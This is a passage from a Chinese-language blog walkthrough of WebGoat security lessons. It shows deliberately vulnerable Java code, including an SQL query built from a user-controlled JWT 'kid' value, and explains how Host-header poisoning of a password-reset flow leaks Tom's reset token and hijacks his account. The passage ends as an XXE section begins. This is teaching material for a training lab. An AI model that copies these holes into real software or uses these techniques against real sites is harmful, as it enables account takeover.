<span class="w">                    </span><span class="n">ResultSet</span><span class="w"> </span><span class="n">rs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">connection</span><span class="p">.</span><span class="na">createStatement</span><span class="p">().</span><span class="na">executeQuery</span><span class="p">(</span><span class="s">&quot;SELECT key FROM jwt_keys WHERE id = &#39;&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">kid</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&quot;&#39;&quot;</span><span class="p">);</span><span class="w"></span>
<span class="w">                    </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">rs</span><span class="p">.</span><span class="na">next</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">                        </span><span class="k">return</span><span class="w"> </span><span class="n">TextCodec</span><span class="p">.</span><span class="na">BASE64</span><span class="p">.</span><span class="na">decode</span><span class="p">(</span><span class="n">rs</span><span class="p">.</span><span class="na">getString</span><span class="p">(</span><span class="mi">1</span><span class="p">));</span><span class="w"></span>
<span class="w">                    </span><span class="p">}</span><span class="w"></span>
<span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">SQLException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">                    </span><span class="n">errorMessage</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">e</span><span class="p">.</span><span class="na">getMessage</span><span class="p">();</span><span class="w"></span>
<span class="w">                </span><span class="p">}</span><span class="w"></span>
<span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w"></span>
<span class="w">            </span><span class="p">}</span><span class="w"></span>
<span class="w">        </span><span class="p">}).</span><span class="na">parseClaimsJws</span><span class="p">(</span><span class="n">token</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="p">......</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">JwtException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">trackProgress</span><span class="p">(</span><span class="n">failed</span><span class="p">().</span><span class="na">feedback</span><span class="p">(</span><span class="s">&quot;jwt-invalid-token&quot;</span><span class="p">).</span><span class="na">output</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="na">toString</span><span class="p">()).</span><span class="na">build</span><span class="p">());</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div>
<p>这次没有使用<code>setSigningKey</code>方法来设置密钥，而是使用<code>setSigningKeyResolver</code>。需要重点关注的是这行代码：</p>
<div class="highlight"><pre><span></span><code><span class="n">ResultSet</span><span class="w"> </span><span class="n">rs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">connection</span><span class="p">.</span><span class="na">createStatement</span><span class="p">().</span><span class="na">executeQuery</span><span class="p">(</span><span class="s">&quot;SELECT key FROM jwt_keys WHERE id = &#39;&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">kid</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&quot;&#39;&quot;</span><span class="p">);</span><span class="w"></span>
</code></pre></div>
<p>这里使用了字符串拼接的方法构造<code>SQL</code>语句并执行，显然是存在注入风险的。而这个<code>kid</code>的值是从<code>header</code>中获取的，<code>header</code>是从前端传过来的<code>token</code>中解码得到的，是用户可控的内容。</p>
<p>（待续......）</p>
<h4 id="password-reset"><code>Password Reset</code></h4>
<p>在密码重置的过程中，根据电子邮件地址是否存在，系统通常会给出不同的提示信息。攻击者可以利用这一点进行网络钓鱼攻击。如果攻击者知道用户在某个站点注册了账户，则攻击者可以创建一封网络钓鱼邮件并将其发送给用户。用户可能更倾向于点击电子邮件，因为用户在该站点拥有有效账户。</p>
<p><code>Security questions</code>，安全问题：当你忘记密码的时候，网站通常会问你安全问题，这些问题是在你注册过程中回答过的。通常情况下，安全问题列表包含固定数量的问题，甚至有时候答案也是有限的。使用这项功能时，用户需要选择一个问题，并自己输入答案。这种方式下，用户不会分享问题，使得攻击者难以破解。</p>
<p>最好的安全问题应该难于破解而易于记忆。因此答案应该是固定的，不能改变。</p>
<p><code>Creating the password reset link</code></p>
<ul>
<li><code>It is a unique link with a random token</code>，链接是唯一的，带有随机令牌；</li>
<li><code>`It can only be used once</code>，它只能使用一次；</li>
<li><code>The link is only valid for a limited amount of time.</code>它只在有限的时间内有效。</li>
</ul>
<p>题目：<code>Creating the password reset link</code></p>
<p><code>Try to reset the password of Tom ([tom@webgoat-cloud.org]) to your own choice and login as Tom with that password. Note: it is not possible to use OWASP ZAP for this lesson, also browsers might not work, command line tools like curl and the like will be more successful for this attack.</code></p>
<p><code>Tom always resets his password immediately after receiving the email with the link.</code></p>
<p>题目意思是你需要重置<code>Tom</code>(邮箱<code>tom@webgoat-cloud.org</code>)的密码，并使用新密码登录<code>Tom</code>账户。如果<code>Tom</code>通过邮件收到链接，他会立即重置密码。</p>
<p><img alt="image-20221229002541556" src="C:/Users/robin/AppData/Roaming/Typora/typora-user-images/image-20221229002541556.png" /></p>
<p>我们先点击<code>access</code>按钮抓个包，看看请求的接口地址等信息：<code>/WebGoat/PasswordReset/reset/login</code>，通过接口地址在源码中查看实现代码</p>
<div class="highlight"><pre><span></span><code><span class="nd">@PostMapping</span><span class="p">(</span><span class="s">&quot;/PasswordReset/reset/login&quot;</span><span class="p">)</span><span class="w"></span>
<span class="nd">@ResponseBody</span><span class="w"></span>
<span class="kd">public</span><span class="w"> </span><span class="n">AttackResult</span><span class="w"> </span><span class="nf">login</span><span class="p">(</span><span class="nd">@RequestParam</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">password</span><span class="p">,</span><span class="w"> </span><span class="nd">@RequestParam</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">email</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">TOM_EMAIL</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="n">email</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">passwordTom</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">usersToTomPassword</span><span class="p">.</span><span class="na">getOrDefault</span><span class="p">(</span><span class="n">getWebSession</span><span class="p">().</span><span class="na">getUserName</span><span class="p">(),</span><span class="w"> </span><span class="n">PASSWORD_TOM_9</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">passwordTom</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="n">PASSWORD_TOM_9</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">trackProgress</span><span class="p">(</span><span class="n">failed</span><span class="p">().</span><span class="na">feedback</span><span class="p">(</span><span class="s">&quot;login_failed&quot;</span><span class="p">).</span><span class="na">build</span><span class="p">());</span><span class="w"></span>
<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">passwordTom</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="n">password</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">trackProgress</span><span class="p">(</span><span class="n">success</span><span class="p">().</span><span class="na">build</span><span class="p">());</span><span class="w"></span>
<span class="w">        </span><span class="p">}</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">trackProgress</span><span class="p">(</span><span class="n">failed</span><span class="p">().</span><span class="na">feedback</span><span class="p">(</span><span class="s">&quot;login_failed.tom&quot;</span><span class="p">).</span><span class="na">build</span><span class="p">());</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div>
<p>代码首先判断输入的邮箱地址是否为<code>Tom</code>的邮箱，如果不是之间返回登录失败；邮箱正确后，接着从<code>usersToTomPassword</code>这个<code>HashMap</code>中根据当前登录的用户名作为<code>key</code>来获取对应的<code>vaue</code>，如果存在当前用户名的键值对，将其值赋给<code>passwordTom</code>，并比较<code>passwordTom</code>与默认的字符串常量<code>PASSWORD_TOM_9</code>是否相等（一般不会相等），如果相等直接返回登录失败；如果不存在当前用户名的键值对，也将返回登录失败；最后比较输入的密码是否与<code>passwordTom</code>相等，只有相等才登录成功。重新梳理一下，我们需要使用<code>Tom</code>的邮箱登录成功，需要我们输入的密码等于<code>passwordTom</code>的值；且<code>userToTomPassword</code>里面必须存在当前用户名（<code>getWebSession().getUserName()</code>这个值也是固定的，就是我们自己的用户名）的键值对，且其值和我们输入的密码的值相同。即只要满足以下等式：</p>
<div class="highlight"><pre><span></span><code><span class="n">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">usersToTomPassword</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">getWebSession</span><span class="p">().</span><span class="na">getUserName</span><span class="p">())</span><span class="err">，</span><span class="p">(</span><span class="n">当然这个值不能和PASSWORD_TOM_9相等</span><span class="p">)</span><span class="w"></span>
</code></pre></div>
<p>这里<code>password</code>是在本次请求中前端传过来的，也是我们输入的密码字段，可以先不管。关注重点放在<code>usersToTomPassword</code>上。与之相关的代码如下：</p>
<div class="highlight"><pre><span></span><code><span class="nd">@PostMapping</span><span class="p">(</span><span class="s">&quot;/PasswordReset/reset/change-password&quot;</span><span class="p">)</span><span class="w"></span>
<span class="kd">public</span><span class="w"> </span><span class="n">ModelAndView</span><span class="w"> </span><span class="nf">changePassword</span><span class="p">(</span><span class="nd">@ModelAttribute</span><span class="p">(</span><span class="s">&quot;form&quot;</span><span class="p">)</span><span class="w"> </span><span class="n">PasswordChangeForm</span><span class="w"> </span><span class="n">form</span><span class="p">,</span><span class="w"> </span><span class="n">BindingResult</span><span class="w"> </span><span class="n">bindingResult</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">ModelAndView</span><span class="w"> </span><span class="n">modelAndView</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ModelAndView</span><span class="p">();</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">org</span><span class="p">.</span><span class="na">springframework</span><span class="p">.</span><span class="na">util</span><span class="p">.</span><span class="na">StringUtils</span><span class="p">.</span><span class="na">hasText</span><span class="p">(</span><span class="n">form</span><span class="p">.</span><span class="na">getPassword</span><span class="p">()))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="n">bindingResult</span><span class="p">.</span><span class="na">rejectValue</span><span class="p">(</span><span class="s">&quot;password&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;not.empty&quot;</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">bindingResult</span><span class="p">.</span><span class="na">hasErrors</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="n">modelAndView</span><span class="p">.</span><span class="na">setViewName</span><span class="p">(</span><span class="s">&quot;password_reset&quot;</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">modelAndView</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">resetLinks</span><span class="p">.</span><span class="na">contains</span><span class="p">(</span><span class="n">form</span><span class="p">.</span><span class="na">getResetLink</span><span class="p">()))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="n">modelAndView</span><span class="p">.</span><span class="na">setViewName</span><span class="p">(</span><span class="s">&quot;password_link_not_found&quot;</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">modelAndView</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">checkIfLinkIsFromTom</span><span class="p">(</span><span class="n">form</span><span class="p">.</span><span class="na">getResetLink</span><span class="p">()))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="n">usersToTomPassword</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">getWebSession</span><span class="p">().</span><span class="na">getUserName</span><span class="p">(),</span><span class="w"> </span><span class="n">form</span><span class="p">.</span><span class="na">getPassword</span><span class="p">());</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
<span class="w">    </span><span class="n">modelAndView</span><span class="p">.</span><span class="na">setViewName</span><span class="p">(</span><span class="s">&quot;success&quot;</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">modelAndView</span><span class="p">;</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>

<span class="kd">private</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">checkIfLinkIsFromTom</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">resetLinkFromForm</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">resetLink</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">userToTomResetLink</span><span class="p">.</span><span class="na">getOrDefault</span><span class="p">(</span><span class="n">getWebSession</span><span class="p">().</span><span class="na">getUserName</span><span class="p">(),</span><span class="w"> </span><span class="s">&quot;unknown&quot;</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">resetLink</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="n">resetLinkFromForm</span><span class="p">);</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div>
<p>在重置密码的接口中会修改<code>usersToTomPassword</code>的值。注意<code>changePassword</code>方法的第四个<code>if</code>判断会检查重置链接是否属于<code>Tom</code>用户（从<code>userToTomResetLink</code>这个<code>HashMap</code>中根据当前用户名获取链接），而<code>userToTomResetLink</code>的值进行修改的相关代码如下：</p>
<div class="highlight"><pre><span></span><code><span class="nd">@PostMapping</span><span class="p">(</span><span class="s">&quot;/PasswordReset/ForgotPassword/create-password-reset-link&quot;</span><span class="p">)</span><span class="w"></span>
<span class="nd">@ResponseBody</span><span class="w"></span>
<span class="kd">public</span><span class="w"> </span><span class="n">AttackResult</span><span class="w"> </span><span class="nf">sendPasswordResetLink</span><span class="p">(</span><span class="nd">@RequestParam</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">email</span><span class="p">,</span><span class="w"> </span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">request</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">resetLink</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">UUID</span><span class="p">.</span><span class="na">randomUUID</span><span class="p">().</span><span class="na">toString</span><span class="p">();</span><span class="w"></span>
<span class="w">    </span><span class="n">ResetLinkAssignment</span><span class="p">.</span><span class="na">resetLinks</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">resetLink</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">host</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getHeader</span><span class="p">(</span><span class="s">&quot;host&quot;</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">hasText</span><span class="p">(</span><span class="n">email</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">email</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="n">ResetLinkAssignment</span><span class="p">.</span><span class="na">TOM_EMAIL</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">host</span><span class="p">.</span><span class="na">contains</span><span class="p">(</span><span class="s">&quot;9090&quot;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="c1">//User indeed changed the host header.</span><span class="w"></span>
<span class="w">            </span><span class="n">ResetLinkAssignment</span><span class="p">.</span><span class="na">userToTomResetLink</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">getWebSession</span><span class="p">().</span><span class="na">getUserName</span><span class="p">(),</span><span class="w"> </span><span class="n">resetLink</span><span class="p">);</span><span class="w"></span>
<span class="w">            </span><span class="n">fakeClickingLinkEmail</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="w"> </span><span class="n">resetLink</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">            </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">                </span><span class="n">sendMailToUser</span><span class="p">(</span><span class="n">email</span><span class="p">,</span><span class="w"> </span><span class="n">host</span><span class="p">,</span><span class="w"> </span><span class="n">resetLink</span><span class="p">);</span><span class="w"></span>
<span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="n">failed</span><span class="p">().</span><span class="na">output</span><span class="p">(</span><span class="s">&quot;E-mail can&#39;t be send. please try again.&quot;</span><span class="p">).</span><span class="na">build</span><span class="p">();</span><span class="w"></span>
<span class="w">            </span><span class="p">}</span><span class="w"></span>
<span class="w">        </span><span class="p">}</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">success</span><span class="p">().</span><span class="na">feedback</span><span class="p">(</span><span class="s">&quot;email.send&quot;</span><span class="p">).</span><span class="na">feedbackArgs</span><span class="p">(</span><span class="n">email</span><span class="p">).</span><span class="na">build</span><span class="p">();</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div>
<p>这里校验了<code>email</code>的地址必须是<code>TOM_EMAIL</code>的值，如果通过就将<code>resetLink</code>放到<code>userToTomResetLink</code>中。因此我们首先需要请求接口地址<code>/PasswordReset/ForgotPassword/create-password-reset-link</code>，并将<code>email</code>地址修改为<code>TOM_EMAIL</code>的值。</p>
<p><img alt="image-20221229121056041" src="https://raw.githubusercontent.com/robinoneway/ImageHost/master/img/image-20221229121056041.png" /></p>
<p>先回到前端页面，梳理整个业务流程。我们在<code>Forgot your password?</code>页面输入自己的邮箱地址后，系统会发送一封带有重置密码链接的邮件到邮箱（只能输入自己的邮箱（实际只认@前面的用户名），如果输入其他用户名的邮箱，我们自己接收不到邮件）。我们在<code>WebWolf</code>系统中可以查看邮件内容，点击邮件内的链接会来到重置密码页面，输入新密码既可以重置密码。</p>
<p><img alt="image-20221229005740252" src="https://raw.githubusercontent.com/robinoneway/ImageHost/master/img/image-20221229005740252.png" /></p>
<div class="highlight"><pre><span></span><code><span class="nd">@PostMapping</span><span class="p">(</span><span class="s">&quot;/PasswordReset/ForgotPassword/create-password-reset-link&quot;</span><span class="p">)</span><span class="w"></span>
<span class="nd">@ResponseBody</span><span class="w"></span>
<span class="kd">public</span><span class="w"> </span><span class="n">AttackResult</span><span class="w"> </span><span class="nf">sendPasswordResetLink</span><span class="p">(</span><span class="nd">@RequestParam</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">email</span><span class="p">,</span><span class="w"> </span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">request</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">resetLink</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">UUID</span><span class="p">.</span><span class="na">randomUUID</span><span class="p">().</span><span class="na">toString</span><span class="p">();</span><span class="w"></span>
<span class="w">    </span><span class="n">ResetLinkAssignment</span><span class="p">.</span><span class="na">resetLinks</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">resetLink</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">host</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getHeader</span><span class="p">(</span><span class="s">&quot;host&quot;</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">hasText</span><span class="p">(</span><span class="n">email</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">email</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="n">ResetLinkAssignment</span><span class="p">.</span><span class="na">TOM_EMAIL</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">host</span><span class="p">.</span><span class="na">contains</span><span class="p">(</span><span class="s">&quot;9090&quot;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="c1">//User indeed changed the host header.</span><span class="w"></span>
<span class="w">            </span><span class="n">ResetLinkAssignment</span><span class="p">.</span><span class="na">userToTomResetLink</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">getWebSession</span><span class="p">().</span><span class="na">getUserName</span><span class="p">(),</span><span class="w"> </span><span class="n">resetLink</span><span class="p">);</span><span class="w"></span>
<span class="w">            </span><span class="n">fakeClickingLinkEmail</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="w"> </span><span class="n">resetLink</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">            </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">                </span><span class="n">sendMailToUser</span><span class="p">(</span><span class="n">email</span><span class="p">,</span><span class="w"> </span><span class="n">host</span><span class="p">,</span><span class="w"> </span><span class="n">resetLink</span><span class="p">);</span><span class="w"></span>
<span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="n">failed</span><span class="p">().</span><span class="na">output</span><span class="p">(</span><span class="s">&quot;E-mail can&#39;t be send. please try again.&quot;</span><span class="p">).</span><span class="na">build</span><span class="p">();</span><span class="w"></span>
<span class="w">            </span><span class="p">}</span><span class="w"></span>
<span class="w">        </span><span class="p">}</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">success</span><span class="p">().</span><span class="na">feedback</span><span class="p">(</span><span class="s">&quot;email.send&quot;</span><span class="p">).</span><span class="na">feedbackArgs</span><span class="p">(</span><span class="n">email</span><span class="p">).</span><span class="na">build</span><span class="p">();</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
<span class="kd">private</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">fakeClickingLinkEmail</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">host</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">resetLink</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="n">HttpHeaders</span><span class="w"> </span><span class="n">httpHeaders</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HttpHeaders</span><span class="p">();</span><span class="w"></span>
<span class="w">        </span><span class="n">HttpEntity</span><span class="w"> </span><span class="n">httpEntity</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HttpEntity</span><span class="p">(</span><span class="n">httpHeaders</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="k">new</span><span class="w"> </span><span class="n">RestTemplate</span><span class="p">().</span><span class="na">exchange</span><span class="p">(</span><span class="n">String</span><span class="p">.</span><span class="na">format</span><span class="p">(</span><span class="s">&quot;http://%s/PasswordReset/reset/reset-password/%s&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">host</span><span class="p">,</span><span class="w"> </span><span class="n">resetLink</span><span class="p">),</span><span class="w"> </span><span class="n">HttpMethod</span><span class="p">.</span><span class="na">GET</span><span class="p">,</span><span class="w"> </span><span class="n">httpEntity</span><span class="p">,</span><span class="w"> </span><span class="n">Void</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="c1">//don&#39;t care</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div>
<p><img alt="image-20221229125411435" src="https://raw.githubusercontent.com/robinoneway/ImageHost/master/img/image-20221229125411435.png" /></p>
<p><img alt="image-20221229125549811" src="https://raw.githubusercontent.com/robinoneway/ImageHost/master/img/image-20221229125549811.png" /></p>
<p><img alt="image-20221229125815000" src="https://raw.githubusercontent.com/robinoneway/ImageHost/master/img/image-20221229125815000.png" /></p>
<p>将<code>resetLink</code>添加到<code>userToTomResetLink</code>中后，由于这一切都是在后端代码中进行的，我们拿不到<code>resetLink</code>的值，也就不能构造重置密码的链接来改变<code>Tom</code>的密码。我们把注意转向<code>fakeClickingLinkEmail</code>这个方法，发现它使用<code>host</code>和<code>resetLink</code>两个参数来拼接重置密码链接，而这个<code>host</code>是前端传过来的值，是完全由我们控制的！我们可以使用<code>host</code>来构造完整的重置链接！</p>
<p><img alt="image-20221229135225397" src="https://raw.githubusercontent.com/robinoneway/ImageHost/master/img/image-20221229135225397.png" /></p>
<p>但是<code>fakeClickingLinkEmail</code>方法中请求链接的方法是<code>HttpMethod.GET</code>，不能触发重置密码的请求<code>(POST)</code>。这里需要用到<code>WebWolf</code>系统的<code>Incoming Requests</code>功能，它会记录请求<code>9090</code>端口的信息。前面的问题是，我们修改邮箱地址为<code>Tom_EMAIL</code>和主机<code>Host</code>端口为<code>9090</code>后，将<code>resetLink</code>添加到<code>userToTomResetLink</code>中，系统会模拟<code>Tom</code>点击重置链接，此时<code>WebWolf</code>会记录下这次模拟请求的信息，其中就包括我们需要的<code>resetLink</code>，</p>
<p><img alt="image-20221230104840738" src="C:/Users/robin/AppData/Roaming/Typora/typora-user-images/image-20221230104840738.png" /></p>
<p>拿到这串<code>UUID</code>后，我们就可以重置<code>Tom</code>的密码了。（先填写包含自己用户名的邮箱，在<code>WebGolf</code>的<code>MailBox</code>模块中查看重置密码的链接，将链接后面的<code>UUID</code>修改为<code>Incoming Requests</code>中记录的值，在页面输入密码并提交，就实现了修改<code>Tom</code>账户的密码。</p>
<p><img alt="image-20221230105756449" src="https://raw.githubusercontent.com/robinoneway/ImageHost/master/img/image-20221230105756449.png" /></p>
<h4 id="xxe">XXE</h4>
<p>什么是<code>XXE</code>：<code>XML External Entity</code>，即<code>XML</code>外部实体</p>
<p><code>XML</code>文档结构包括<code>XML</code>声明、<code>DTD</code>文档类型定义（可选）、文档元素。</p>
<p><code>DTD</code>可被成行地声明于<code>XML</code>文档中，也可作为一个外部引用。</p>
<ul>
<li>内部<code>DOCTYPE</code>声明</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="k">&lt;!DOCTYPE</span> <span class="nt">根元素</span> <span class="k">[</span><span class="err">元素声明</span><span class="k">]&gt;</span>
</code></pre></div>
<ul>
<li>外部文档声明</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="k">&lt;!DOCTYPE</span> <span class="nt">根元素</span> <span class="kc">SYSTEM</span> <span class="s2">&quot;文件名&quot;</span><span class="k">&gt;</span>
</code></pre></div>
<p>什么是<code>XML Entity</code>：<code>XML Entity</code>是<strong>用于定义引用普通文本或特殊字符地快捷方式地变量</strong>，它允许定义标签<code>Tag</code>，当<code>XML</code>文件被解析时，使用内容替换标签。通常<code>XML Entity</code>可以分为三种：</p>
<ul>
<li><code>Internal Entity</code>，内部实体</li>
</ul>
